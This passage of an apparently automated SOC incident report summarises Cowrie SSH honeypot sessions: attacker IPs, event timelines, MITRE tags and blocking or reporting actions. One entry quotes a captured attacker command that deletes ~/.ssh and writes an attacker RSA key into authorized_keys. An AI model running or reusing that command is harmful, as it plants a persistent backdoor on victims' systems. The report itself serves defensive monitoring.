| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:54:00` | `cowrie.session.connect` |
| `2026-07-21 06:54:00` | `cowrie.client.version` |
| `2026-07-21 06:54:00` | `cowrie.client.kex` |
| `2026-07-21 06:54:02` | `cowrie.login.success` |
| `2026-07-21 06:54:03` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6969c0b80b5

| Field | Detail |
|---|---|
| **Source IP** | `222.139.245[.]137` |
| **First Seen** | 2026-07-21 06:54 |
| **Last Seen** | 2026-07-21 06:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:54:13` | `cowrie.session.connect` |
| `2026-07-21 06:54:14` | `cowrie.client.version` |
| `2026-07-21 06:54:14` | `cowrie.client.kex` |
| `2026-07-21 06:54:15` | `cowrie.login.success` |
| `2026-07-21 06:54:16` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.139.245[.]137` to AbuseIPDB if not already reported
- [ ] Block `222.139.245[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ccfbb267d4d

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-21 06:57 |
| **Last Seen** | 2026-07-21 06:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:57:21` | `cowrie.session.connect` |
| `2026-07-21 06:57:22` | `cowrie.client.version` |
| `2026-07-21 06:57:22` | `cowrie.client.kex` |
| `2026-07-21 06:57:24` | `cowrie.login.success` |
| `2026-07-21 06:57:25` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8af22abc9f6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.195[.]143` |
| **First Seen** | 2026-07-21 07:00 |
| **Last Seen** | 2026-07-21 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:00:28` | `cowrie.session.connect` |
| `2026-07-21 07:00:29` | `cowrie.login.success` |
| `2026-07-21 07:00:29` | `cowrie.session.params` |
| `2026-07-21 07:00:30` | `cowrie.command.input` |
| `2026-07-21 07:00:30` | `cowrie.command.input` |
| `2026-07-21 07:00:30` | `cowrie.command.input` |
| `2026-07-21 07:00:31` | `cowrie.command.input` |
| `2026-07-21 07:00:31` | `cowrie.command.failed` |
| `2026-07-21 07:00:31` | `cowrie.log.closed` |
| `2026-07-21 07:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.195[.]143` to AbuseIPDB if not already reported
- [ ] Block `217.60.195[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac8c0dbe703

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 07:02 |
| **Last Seen** | 2026-07-21 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:02:13` | `cowrie.session.connect` |
| `2026-07-21 07:02:13` | `cowrie.client.version` |
| `2026-07-21 07:02:14` | `cowrie.client.kex` |
| `2026-07-21 07:02:14` | `cowrie.login.success` |
| `2026-07-21 07:02:14` | `cowrie.session.params` |
| `2026-07-21 07:02:14` | `cowrie.command.input` |
| `2026-07-21 07:02:15` | `cowrie.log.closed` |
| `2026-07-21 07:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249cef27ab20

| Field | Detail |
|---|---|
| **Source IP** | `34.76.235[.]60` |
| **First Seen** | 2026-07-21 07:04 |
| **Last Seen** | 2026-07-21 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:04:26` | `cowrie.session.connect` |
| `2026-07-21 07:04:26` | `cowrie.client.version` |
| `2026-07-21 07:04:26` | `cowrie.client.kex` |
| `2026-07-21 07:04:29` | `cowrie.login.success` |
| `2026-07-21 07:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.235[.]60` to AbuseIPDB if not already reported
- [ ] Block `34.76.235[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638c10853870

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-21 07:06 |
| **Last Seen** | 2026-07-21 07:11 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:06:41` | `cowrie.session.connect` |
| `2026-07-21 07:06:42` | `cowrie.client.version` |
| `2026-07-21 07:06:42` | `cowrie.client.kex` |
| `2026-07-21 07:06:44` | `cowrie.login.success` |
| `2026-07-21 07:06:45` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3feb2235730c

| Field | Detail |
|---|---|
| **Source IP** | `31.41.81[.]65` |
| **First Seen** | 2026-07-21 07:06 |
| **Last Seen** | 2026-07-21 07:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:06:50` | `cowrie.session.connect` |
| `2026-07-21 07:06:51` | `cowrie.client.version` |
| `2026-07-21 07:06:51` | `cowrie.client.kex` |
| `2026-07-21 07:06:52` | `cowrie.login.success` |
| `2026-07-21 07:06:52` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.81[.]65` to AbuseIPDB if not already reported
- [ ] Block `31.41.81[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983800fa1d21

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-07-21 07:07 |
| **Last Seen** | 2026-07-21 07:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:07:02` | `cowrie.session.connect` |
| `2026-07-21 07:07:02` | `cowrie.client.version` |
| `2026-07-21 07:07:02` | `cowrie.client.kex` |
| `2026-07-21 07:07:03` | `cowrie.login.success` |
| `2026-07-21 07:07:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f729301da1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 07:09 |
| **Last Seen** | 2026-07-21 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:09:34` | `cowrie.session.connect` |
| `2026-07-21 07:09:35` | `cowrie.client.version` |
| `2026-07-21 07:09:35` | `cowrie.client.kex` |
| `2026-07-21 07:09:36` | `cowrie.login.success` |
| `2026-07-21 07:09:37` | `cowrie.session.params` |
| `2026-07-21 07:09:37` | `cowrie.command.input` |
| `2026-07-21 07:09:37` | `cowrie.log.closed` |
| `2026-07-21 07:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd3fb8a342d

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-21 07:09 |
| **Last Seen** | 2026-07-21 07:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:09:43` | `cowrie.session.connect` |
| `2026-07-21 07:09:44` | `cowrie.client.version` |
| `2026-07-21 07:09:44` | `cowrie.client.kex` |
| `2026-07-21 07:09:45` | `cowrie.login.success` |
| `2026-07-21 07:09:46` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd8709ed3ce

| Field | Detail |
|---|---|
| **Source IP** | `201.51.3[.]244` |
| **First Seen** | 2026-07-21 07:14 |
| **Last Seen** | 2026-07-21 07:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:14:13` | `cowrie.session.connect` |
| `2026-07-21 07:14:13` | `cowrie.client.version` |
| `2026-07-21 07:14:13` | `cowrie.client.kex` |
| `2026-07-21 07:14:14` | `cowrie.login.success` |
| `2026-07-21 07:14:15` | `cowrie.session.params` |
| `2026-07-21 07:14:15` | `cowrie.command.input` |
| `2026-07-21 07:14:15` | `cowrie.command.failed` |
| `2026-07-21 07:14:15` | `cowrie.log.closed` |
| `2026-07-21 07:14:16` | `cowrie.session.params` |
| `2026-07-21 07:14:16` | `cowrie.command.input` |
| `2026-07-21 07:14:16` | `cowrie.session.file_download` |
| `2026-07-21 07:14:16` | `cowrie.log.closed` |
| `2026-07-21 07:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.51.3[.]244` to AbuseIPDB if not already reported
- [ ] Block `201.51.3[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73fce1a561dd

| Field | Detail |
|---|---|
| **Source IP** | `201.51.3[.]244` |
| **First Seen** | 2026-07-21 07:14 |
| **Last Seen** | 2026-07-21 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:14:16` | `cowrie.session.connect` |
| `2026-07-21 07:14:16` | `cowrie.client.version` |
| `2026-07-21 07:14:16` | `cowrie.client.kex` |
| `2026-07-21 07:14:17` | `cowrie.login.success` |
| `2026-07-21 07:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.51.3[.]244` to AbuseIPDB if not already reported
- [ ] Block `201.51.3[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9598adc47c81

| Field | Detail |
|---|---|
| **Source IP** | `201.51.3[.]244` |
| **First Seen** | 2026-07-21 07:14 |
| **Last Seen** | 2026-07-21 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:14:17` | `cowrie.session.connect` |
| `2026-07-21 07:14:17` | `cowrie.client.version` |
| `2026-07-21 07:14:17` | `cowrie.client.kex` |
| `2026-07-21 07:14:17` | `cowrie.login.success` |
| `2026-07-21 07:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.51.3[.]244` to AbuseIPDB if not already reported
- [ ] Block `201.51.3[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fddf95eeca9

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-07-21 07:18 |
| **Last Seen** | 2026-07-21 07:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:18:42` | `cowrie.session.connect` |
| `2026-07-21 07:18:43` | `cowrie.client.version` |
| `2026-07-21 07:18:43` | `cowrie.client.kex` |
| `2026-07-21 07:18:47` | `cowrie.login.success` |
| `2026-07-21 07:18:48` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa27f045d4f7

| Field | Detail |
|---|---|
| **Source IP** | `14.29.204[.]161` |
| **First Seen** | 2026-07-21 07:18 |
| **Last Seen** | 2026-07-21 07:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:18:57` | `cowrie.session.connect` |
| `2026-07-21 07:18:58` | `cowrie.client.version` |
| `2026-07-21 07:18:58` | `cowrie.client.kex` |
| `2026-07-21 07:19:00` | `cowrie.login.success` |
| `2026-07-21 07:19:00` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.204[.]161` to AbuseIPDB if not already reported
- [ ] Block `14.29.204[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de88bf5f8a71

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-21 07:29 |
| **Last Seen** | 2026-07-21 07:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:29:59` | `cowrie.session.connect` |
| `2026-07-21 07:29:59` | `cowrie.client.version` |
| `2026-07-21 07:29:59` | `cowrie.client.kex` |
| `2026-07-21 07:30:00` | `cowrie.login.success` |
| `2026-07-21 07:30:01` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca03f6f1cfb3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-07-21 07:30 |
| **Last Seen** | 2026-07-21 07:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:30:10` | `cowrie.session.connect` |
| `2026-07-21 07:30:11` | `cowrie.client.version` |
| `2026-07-21 07:30:11` | `cowrie.client.kex` |
| `2026-07-21 07:30:12` | `cowrie.login.success` |
| `2026-07-21 07:30:13` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0bbb46e6e9e

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-07-21 07:31 |
| **Last Seen** | 2026-07-21 07:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:31:40` | `cowrie.session.connect` |
| `2026-07-21 07:31:41` | `cowrie.client.version` |
| `2026-07-21 07:31:41` | `cowrie.client.kex` |
| `2026-07-21 07:31:43` | `cowrie.login.success` |
| `2026-07-21 07:31:44` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96561ed38fb

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-07-21 07:33 |
| **Last Seen** | 2026-07-21 07:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:33:16` | `cowrie.session.connect` |
| `2026-07-21 07:33:17` | `cowrie.client.version` |
| `2026-07-21 07:33:17` | `cowrie.client.kex` |
| `2026-07-21 07:33:23` | `cowrie.login.success` |
| `2026-07-21 07:33:26` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df565d72732b

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-21 07:33 |
| **Last Seen** | 2026-07-21 07:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:33:36` | `cowrie.session.connect` |
| `2026-07-21 07:33:36` | `cowrie.client.version` |
| `2026-07-21 07:33:36` | `cowrie.client.kex` |
| `2026-07-21 07:33:38` | `cowrie.login.success` |
| `2026-07-21 07:33:39` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac3af7cd621

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-07-21 07:40 |
| **Last Seen** | 2026-07-21 07:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:40:00` | `cowrie.session.connect` |
| `2026-07-21 07:40:01` | `cowrie.client.version` |
| `2026-07-21 07:40:01` | `cowrie.client.kex` |
| `2026-07-21 07:40:04` | `cowrie.login.success` |
| `2026-07-21 07:40:05` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e30792c698

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-21 07:40 |
| **Last Seen** | 2026-07-21 07:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:40:15` | `cowrie.session.connect` |
| `2026-07-21 07:40:15` | `cowrie.client.version` |
| `2026-07-21 07:40:15` | `cowrie.client.kex` |
| `2026-07-21 07:40:16` | `cowrie.login.success` |
| `2026-07-21 07:40:17` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1facda783662

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-21 07:43 |
| **Last Seen** | 2026-07-21 07:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:43:24` | `cowrie.session.connect` |
| `2026-07-21 07:43:25` | `cowrie.client.version` |
| `2026-07-21 07:43:25` | `cowrie.client.kex` |
| `2026-07-21 07:43:28` | `cowrie.login.success` |
| `2026-07-21 07:43:28` | `cowrie.direct-tcpip.request` |
| `2026-07-21 07:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205da3ae5ce7

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 07:43 |
| **Last Seen** | 2026-07-21 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:43:29` | `cowrie.session.connect` |
| `2026-07-21 07:43:29` | `cowrie.client.version` |
| `2026-07-21 07:43:30` | `cowrie.client.kex` |
| `2026-07-21 07:43:31` | `cowrie.login.success` |
| `2026-07-21 07:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c44daa7dc142

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 07:43 |
| **Last Seen** | 2026-07-21 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 07:43:30` | `cowrie.session.connect` |
| `2026-07-21 07:43:30` | `cowrie.client.version` |
